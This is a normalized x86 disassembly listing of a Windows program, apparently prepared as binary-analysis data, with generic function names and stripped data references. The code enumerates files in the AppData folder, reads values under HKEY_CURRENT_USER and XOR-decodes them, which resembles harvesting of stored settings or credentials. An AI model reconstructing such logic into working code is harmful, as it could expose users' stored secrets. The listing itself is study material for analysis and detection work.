lea eax [ ebp - 0x737 ]
push edi
push eax
mov [ ebp - 0x738 ] 0x0
call sub_41112d
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4068be
add esp 0x44
push [ ebp + 0xc ]
lea eax [ ebp - 0x224 ]
push eax
call sub_406a36
lea eax [ ebp - 0x224 ]
push eax
lea eax [ ebp - 0x42c ]
push eax
call sub_4116d8
lea eax [ ebp - 0x42c ]
push r--data
push eax
call sub_410c4c
mov ebx eax
add esp 0x18
cmp ebx edi
jne r-xdata
push 0x1
call [ Sleep@IAT ]
push 0x3e8
call sub_411160
push [ ebp + 0xc ]
mov esi eax
push esi
call sub_4116d8
push r--data
push esi
call sub_411657
lea eax [ ebp - 0x84c ]
push eax
push esi
call sub_411657
add esp 0x1c
test [ ebp - 0x878 ] 0x10
jne r-xdata
push ebx
mov esi 0x104
lea eax [ ebp - 0x120 ]
push esi
push eax
call sub_40686c
lea eax [ ebp - 0x120 ]
push r--data
push eax
call sub_41188f
lea ecx [ ebp - 0x120 ]
add esp 0x14
cmp eax ecx
je r-xdata
xor al al
jmp r-xdata
push esi
call sub_410a7a
pop ecx
lea eax [ ebp - 0x878 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x224 ]
push esi
push eax
call sub_4116d8
pop ecx
pop ecx
lea eax [ ebp - 0x120 ]
push eax
call sub_411738
inc eax
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x328 ]
push eax
call sub_4110cf
push ebx
lea eax [ ebp - 0x120 ]
push esi
push eax
call sub_40686c
add esp 0x1c
test eax eax
je r-xdata
mov eax ecx
push r--data
push eax
call sub_41188f
pop ecx
pop ecx
lea ecx [ ebp - 0x120 ]
cmp eax ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
call sub_410b53
pop ecx
mov al 0x1
mov edi r--data
mov eax ecx
push r--data
push eax
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x120 ]
push eax
call sub_411738
inc eax
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x328 ]
push eax
call sub_4110cf
push ebx
lea eax [ ebp - 0x120 ]
push esi
push eax
call sub_40686c
add esp 0x1c
test eax eax
jne r-xdata
jmp r-xdata
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x1c ]
call sub_40eb9e
push 0x2
push edi
push ebx
call sub_410e24
push ebx
call sub_410e80
push edi
push edi
push ebx
mov esi eax
call sub_410e24
lea eax [ esi + 0x5 ]
push eax
call sub_411160
push ebx
push 0x1
mov edi eax
push esi
push edi
call sub_410d0d
add esp 0x30
push edi
push esi
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x1c ]
call sub_40ec7e
push edi
call sub_410a7a
pop ecx
lea ecx [ ebp - 0x1c ]
call sub_40ed8a
jmp r-xdata
lea eax [ ebp - 0x328 ]
push edi
push eax
call sub_411692
test eax eax
pop ecx
pop ecx
jne r-xdata
push ebx
lea eax [ ebp - 0x120 ]
push esi
push eax
call sub_40686c
lea eax [ ebp - 0x120 ]
push edi
push eax
call sub_411692
add esp 0x14
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x738 ]
push esi
push eax
call sub_40686c
push ebx
lea eax [ ebp - 0x120 ]
push esi
push eax
call sub_40686c
push ebx
lea eax [ ebp - 0x634 ]
push esi
push eax
call sub_40686c
push ebx
lea eax [ ebp - 0x530 ]
push esi
push eax
call sub_40686c
mov ecx [ ebp + 0x8 ]
add esp 0x30
lea eax [ ebp - 0x634 ]
push eax
lea eax [ ebp - 0x738 ]
push eax
lea eax [ ebp - 0x530 ]
push eax
call sub_406595
mov ecx [ ebp + 0x8 ]
dec eax
push eax
call sub_406579
mov ecx eax
call sub_4062e0
sub_406f59
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
lea eax [ ebp - 0x207 ]
push ebx
push eax
mov [ ebp - 0x208 ] bl
call sub_41112d
push esi
lea eax [ ebp - 0x103 ]
push ebx
push eax
mov [ ebp - 0x104 ] bl
call sub_41112d
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
mov esi r--data
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_411657
push [ ebp + 0x10 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_410c4c
mov edi eax
add esp 0x40
cmp edi ebx
jne r-xdata
mov ebx 0x104
jmp r-xdata
xor al al
jmp r-xdata
push edi
lea eax [ ebp - 0x208 ]
push ebx
push eax
call sub_40686c
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_41188f
pop ecx
pop ecx
lea ecx [ ebp - 0x208 ]
cmp eax ecx
jne r-xdata
push edi
call sub_410b53
pop ecx
mov al 0x1
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_411657
push [ ebp + 0x10 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_411657
lea eax [ ebp - 0x203 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push eax
push [ ebp + 0x8 ]
call sub_406b94
add esp 0x30
sub_40709e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_4064ce
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_406f59
add esp 0xc
test al al
setne al
pop ebp
retn
sub_4070c4
push ebp
mov ebp esp
sub esp 0x6b4
push ebx
push esi
push edi
call sub_40f095
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esp
mov [ ebp - 0xc ] ebp
lea eax [ ebp - 0x4 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
mov [ ebp - 0x30 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] sub_40f09c
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
lea ecx [ ebp - 0x4ac ]
call sub_406469
lea eax [ ebp - 0x6b4 ]
push r--data
push eax
call sub_4116d8
lea eax [ ebp - 0x5b0 ]
push r--data
push eax
call sub_4116d8
lea eax [ ebp - 0x6b4 ]
add esp 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] 0x2
xor esi esi
push [ ebp - 0x10 ]
mov ecx eax
call sub_406695
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x4ac ]
push eax
push edi
mov ecx esi
call sub_406680
push eax
call sub_40709e
add esp 0xc
inc edi
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_40667d
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
add [ ebp - 0x10 ] 0x104
dec [ ebp - 0x24 ]
jne r-xdata
mov ecx esi
call sub_40659c
push esi
call sub_410a7a
pop ecx
push 0x110
call sub_411160
test eax eax
pop ecx
je r-xdata
call sub_40b79a
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40eb9e
lea ecx [ ebp - 0x4ac ]
xor esi esi
call sub_406595
test eax eax
jle r-xdata
lea ecx [ ebp - 0x50 ]
call sub_40ed8a
lea ecx [ ebp - 0x4ac ]
call sub_4064b6
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
leave
retn
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
push eax
call sub_411738
pop ecx
push eax
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_40c364
add esp 0xc
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
xor edi edi
cmp [ eax + 0x104 ] edi
je r-xdata
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_40641e
test eax eax
jle r-xdata
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
push [ eax + 0x104 ]
lea ecx [ ebp - 0x4ac ]
push esi
call sub_406579
push [ eax + 0x104 ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
lea ecx [ ebp - 0x20 ]
call sub_40f609
lea ecx [ ebp - 0x4ac ]
inc esi
call sub_406595
cmp esi eax
jl r-xdata
push edi
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_4063fb
push eax
call sub_411738
sub esp 0xc
mov ebx esp
push eax
push edi
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_4063fb
push eax
push ebx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x5d ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x5d ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
push edi
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_4063fb
add eax 0x104
push eax
call sub_411738
sub esp 0xc
mov ebx esp
push eax
push edi
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_4063fb
add eax 0x104
push eax
push ebx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x77 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x77 ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
push edi
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_4063fb
add eax 0x208
push eax
call sub_411738
sub esp 0xc
mov ebx esp
push eax
push edi
push esi
lea ecx [ ebp - 0x4ac ]
call sub_406579
mov ecx eax
call sub_4063fb
add eax 0x208
push eax
push ebx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x6a ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x6a ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x50 ]
call sub_40ec7e
push esi
lea ecx [ ebp - 0x4ac ]
inc edi
call sub_406579
mov ecx eax
call sub_40641e
cmp edi eax
jl r-xdata
sub_407473
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push esi
call sub_410bf3
push esi
mov edi eax
call sub_411738
add esp 0x10
dec eax
test eax eax
mov ecx eax
jle r-xdata
test ecx ecx
jl r-xdata
mov dl [ ecx + esi ]
cmp dl 0xd
je r-xdata
mov eax edi
pop edi
pop esi
retn
lea edx [ ecx + 0x1 ]
cmp edx eax
jg r-xdata
dec ecx
test ecx ecx
jg r-xdata
cmp dl 0xa
je r-xdata
mov [ ecx + esi + 0x1 ] 0x0
cmp dl 0x9
jne r-xdata
sub_4074c5
push ebp
mov ebp esp
sub esp 0x404
push 0x3ff
lea eax [ ebp - 0x403 ]
push 0x0
push eax
mov [ ebp - 0x404 ] 0x0
call sub_41112d
push [ ebp + 0xc ]
lea eax [ ebp - 0x404 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_41188f
mov [ eax ] 0x5c
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_410c4c
add esp 0x34
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
push eax
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_407473
add esp 0xc
test eax eax
je r-xdata
xor al al
leave
retn
push [ ebp - 0x4 ]
call sub_410b53
pop ecx
leave
retn
push edi
push ebx
mov edi r--data
push esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call sub_407473
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebx + 0x2 ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call sub_41188f
mov ebx eax
test ebx ebx
pop ecx
pop ecx
je r-xdata
jmp r-xdata
cmp [ ebx + 0x3 ] 0x0
je r-xdata
pop esi
pop ebx
pop edi
push edi
push eax
call sub_41188f
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push r--data
push ebx
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
cmp eax esi
jb r-xdata
push edi
inc esi
push esi
call sub_41188f
mov esi eax
inc esi
push edi
push esi
call sub_41188f
sub eax esi
push eax
push esi
push [ ebp + 0x8 ]
call sub_4117bc
add esp 0x1c
sub_407608
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x103 ]
push ebx
push eax
mov [ ebp - 0x104 ] bl
call sub_41112d
mov esi r--data
lea edi [ ebp - 0x208 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xf8
lea eax [ ebp - 0x1fc ]
push ebx
push eax
movsd [ edi ] [ esi ]
call sub_41112d
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call sub_4074c5
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_41188f
add esp 0x40
mov [ eax ] 0x5c
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_410c4c
mov esi eax
cmp esi ebx
pop ecx
pop ecx
jne r-xdata
push 0x2
push ebx
push esi
call sub_410e24
push esi
call sub_410e80
push ebx
push ebx
push esi
mov edi eax
call sub_410e24
push edi
call sub_411160
push esi
push 0x1
mov ebx eax
push edi
push ebx
call sub_410d0d
add esp 0x30
push ebx
push edi
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0xc ]
call sub_40ec7e
push ebx
call sub_410a7a
push esi
call sub_410b53
pop ecx
pop ecx
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_407720
push ebp
mov ebp esp
sub esp 0x208
push esi
push edi
mov esi 0x103
push esi
lea eax [ ebp - 0x207 ]
push 0x0
push eax
mov [ ebp - 0x208 ] 0x0
call sub_41112d
push esi
lea eax [ ebp - 0x103 ]
push 0x0
push eax
mov [ ebp - 0x104 ] 0x0
call sub_41112d
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_410c4c
mov edi eax
add esp 0x30
test edi edi
jne r-xdata
mov esi 0x104
jmp r-xdata
xor al al
jmp r-xdata
push edi
lea eax [ ebp - 0x208 ]
push esi
push eax
call sub_407473
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_41188f
pop ecx
pop ecx
lea ecx [ ebp - 0x208 ]
cmp eax ecx
jne r-xdata
push edi
call sub_410b53
pop ecx
mov al 0x1
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_4116d8
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x203 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_411657
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_407608
add esp 0x20
sub_407828
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_411738
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0xc ]
call sub_40ec7e
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407720
test al al
pop ecx
pop ecx
jne r-xdata
mov ebx r--data
mov esi ebx
lea edi [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
push eax
push eax
movsb [ edi ] [ esi ]
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push ebx
call sub_40f45c
mov ecx [ ebp + 0xc ]
call sub_40ec7e
mov bl 0x1
jmp r-xdata
xor bl bl
lea ecx [ ebp - 0x18 ]
call sub_40f609
pop edi
pop esi
mov al bl
pop ebx
leave
retn
sub_4078b7
push ebp
mov ebp esp
sub esp 0x148
push esi
push edi
call sub_40f095
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esp
mov [ ebp - 0xc ] ebp
lea eax [ ebp - 0x4 ]
push eax
call sub_40f06f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
mov [ ebp - 0x18 ] eax
push [ fs : 0x0 ]
pop [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] sub_40f09c
lea eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
push 0x44c
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x38 ]
call sub_40eb9e
push r--data
lea ecx [ ebp - 0x148 ]
call sub_406695
lea ecx [ ebp - 0x148 ]
call sub_40667d
mov edi eax
xor esi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x148 ]
call sub_40659c
lea ecx [ ebp - 0x38 ]
call sub_40ed8a
mov eax [ ebp - 0x20 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x38 ]
push eax
push esi
lea ecx [ ebp - 0x148 ]
call sub_406680
push eax
call sub_407828
inc esi
cmp esi edi
pop ecx
pop ecx
jl r-xdata
sub_407988
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
xor ebx ebx
mov esi 0x104
push esi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_411051
push esi
mov [ ebp - 0x8 ] eax
call sub_411051
pop ecx
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x5c ]
call sub_40eb9e
mov edi 0x1f4
push edi
call sub_411051
push edi
mov [ ebp - 0x4 ] eax
call sub_411051
mov edi [ SHGetSpecialFolderPathA@IAT ]
pop ecx
pop ecx
push ebx
push 0x1a
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
push ebx
call edi
push r--data
push [ ebp - 0x4 ]
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call sub_40b285
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ ebp - 0xc ] ebx
push [ ebp - 0x3c ]
push [ ebp - 0x38 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x5c ]
call sub_40ec7e
lea eax [ ebp - 0x44 ]
push eax
call sub_40b2e7
pop ecx
jmp r-xdata
push [ ebp - 0x14 ]
call sub_410d3e
push [ ebp - 0x4 ]
call sub_410d3e
pop ecx
pop ecx
push ebx
push 0x1a
push [ ebp - 0x4 ]
push ebx
call edi
push r--data
push [ ebp - 0x4 ]
call [ lstrcatA@IAT ]
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push r--data
push [ ebp - 0x14 ]
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
call sub_40b285
add esp 0x18
test eax eax
je r-xdata
inc [ ebp - 0x18 ]
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_411738
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x5c ]
call sub_40ec7e
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x5c ]
call sub_40ec7e
lea ecx [ ebp - 0x34 ]
call sub_40f609
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x64
jl r-xdata
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x5c ]
call sub_40ec7e
lea eax [ ebp - 0x34 ]
push eax
call sub_40b2e7
pop ecx
mov [ ebp - 0x1c ] ebx
push esi
push ebx
push [ ebp - 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] esi
call sub_41112d
push esi
push ebx
push [ ebp - 0x10 ]
call sub_41112d
add esp 0x18
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
push ebx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x18 ]
push [ ebp - 0x20 ]
call [ RegEnumValueA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push [ ebp - 0x20 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x8 ]
call sub_410d3e
push [ ebp - 0x10 ]
call sub_410d3e
pop ecx
pop ecx
lea ecx [ ebp - 0x5c ]
call sub_40ed8a
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_407bc0
mov ecx [ esp + 0x4 ]
jmp r-xdata
movsx eax [ ecx ]
test [ eax * 2 + rw-data ] 0x8
jne r-xdata
inc ecx
movsx eax [ ecx ]
inc ecx
cmp eax 0x2d
push esi
mov esi eax
je r-xdata
movsx eax [ ecx ]
inc ecx
cmp eax 0x2b
jne r-xdata
test [ eax * 2 + rw-data ] 0x4
jne r-xdata
xor edx edx
jmp r-xdata
imul edx edx 0xa
lea edx [ edx + eax - 0x30 ]
movsx eax [ ecx ]
inc ecx
cmp esi 0x2d
mov eax edx
pop esi
jne r-xdata
and eax 0xff
retn
neg edx
mov eax edx
sub_407c14
push ebp
mov ebp esp
sub esp 0x200
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
xor ebx ebx
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
push 0x1f3
lea eax [ ebp - 0x1ff ]
push ebx
push eax
mov [ ebp - 0xc ] 0x3
mov [ ebp - 0x200 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp [ ebp - 0x8 ] ebx
pop ebx
je r-xdata
push 0x4a
pop eax
leave
retn
lea eax [ ebp - 0x200 ]
push eax
call sub_407bc0
pop ecx
leave
retn
sub_407c94
push ebp
mov ebp esp
sub esp 0x440
push ebx
push esi
push edi
xor ebx ebx
push 0x1fc
lea eax [ ebp - 0x24b ]
push ebx
push eax
mov [ ebp - 0x24c ] bl
call sub_41112d
add esp 0xc
push [ rw-data ]
mov [ ebp - 0x4f ] bx
sub esp 0x10
mov ecx esp
push r--data
mov [ ebp - 0x4d ] bl
call sub_40f45c
lea ecx [ ebp - 0x3c ]
call sub_40eb9e
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
call sub_407c14
mov esi 0x200
push esi
mov [ ebp - 0x5 ] al
lea eax [ ebp - 0x24c ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
call sub_41112d
mov edi [ RegEnumValueA@IAT ]
add esp 0xc
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24c ]
push eax
push ebx
jmp r-xdata
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] esi
call edi
test eax eax
je r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push ebx
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0xc ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
push esi
lea eax [ ebp - 0x24c ]
push ebx
push eax
call sub_41112d
add esp 0xc
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0x10 ]
cmp [ ebp - 0x4 ] 0x4
jbe r-xdata
push 0x1f3
lea eax [ ebp - 0x43f ]
push ebx
push eax
mov [ ebp - 0x440 ] bl
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] 0x3
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push 0x4
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
lea eax [ ebp - 0x43c ]
push eax
call sub_411738
cmp eax 0x1
pop ecx
je r-xdata
mov cl [ ebp - 0x5 ]
xor [ ebp + eax - 0x440 ] cl
inc eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
lea eax [ ebp - 0x24c ]
push eax
call sub_411738
push eax
lea eax [ ebp - 0x24c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x3c ]
call sub_40ec7e
lea eax [ ebp - 0x43c ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x43c ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x49 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40f80b
lea ecx [ ebp - 0x49 ]
call sub_40f609
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x3c ]
call sub_40ec7e
lea ecx [ ebp - 0x20 ]
call sub_40f609
sub_407ec4
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_40b285
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
cmp ebx 0x20
mov eax [ ebp - 0x8 ]
jbe r-xdata
test ebx ebx
jl r-xdata
push 0x20
pop ebx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40b2e7
pop ecx
lea esi [ eax + 0x4 ]
mov edi [ esi ]
add esi 0x4
push esi
push esi
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
dec ebx
lea eax [ edi + esi ]
jns r-xdata
sub_407f30
push ebp
mov ebp esp
sub esp 0x38
push ebx
push esi
push edi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
call sub_40b285
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_40b2e7
pop ecx
pop edi
pop esi
pop ebx
leave
retn
xor esi esi
mov [ ebp - 0x1 ] 0x0
cmp esi [ ebp - 0x2c ]
mov [ ebp - 0x1 ] 0x1
jb r-xdata
test bl 0x1
je r-xdata
lea ecx [ ebp - 0x18 ]
and ebx 0xfffffffd
call sub_40f609
test bl 0x2
je r-xdata
mov eax [ ebp - 0x30 ]
add eax esi
push eax
call sub_411738
